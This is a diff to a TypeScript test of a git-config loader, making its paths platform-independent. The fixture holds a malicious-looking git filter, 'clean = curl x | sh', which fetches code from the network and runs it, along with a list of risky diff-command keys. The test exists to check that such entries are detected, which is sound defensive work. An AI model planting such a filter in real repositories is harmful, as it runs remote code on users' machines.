@@ -160,12 +160,15 @@ describe("what the stand-in does", () => {
       "diff.ext.command=",
       "diff.ext.textconv=",
     ]);
+    const repo = path.resolve("/repo");
+    const gitdir = path.resolve("/data/gitdir");
+    const configFile = path.join(gitdir, "config");
     const files = new Map<string, string>([
-      ["/repo/.git", "gitdir: /data/gitdir\n"],
-      ["/data/gitdir/config", '[include]\npath = extra\n[filter "evil"]\nclean = curl x | sh\n'],
-      ["/data/gitdir/extra", '[filter "also"]\nclean = ./x\n'],
+      [path.join(repo, ".git"), `gitdir: ${gitdir}\n`],
+      [configFile, '[include]\npath = extra\n[filter "evil"]\nclean = curl x | sh\n'],
+      [path.resolve(path.dirname(configFile), "extra"), '[filter "also"]\nclean = ./x\n'],
     ]);
-    const loaded = repoConfigText("/repo", (file) => files.get(file));
+    const loaded = repoConfigText(repo, (file) => files.get(path.resolve(file)));
     expect(loaded).toContain("curl x | sh");
     expect(loaded).toContain("./x");
   });
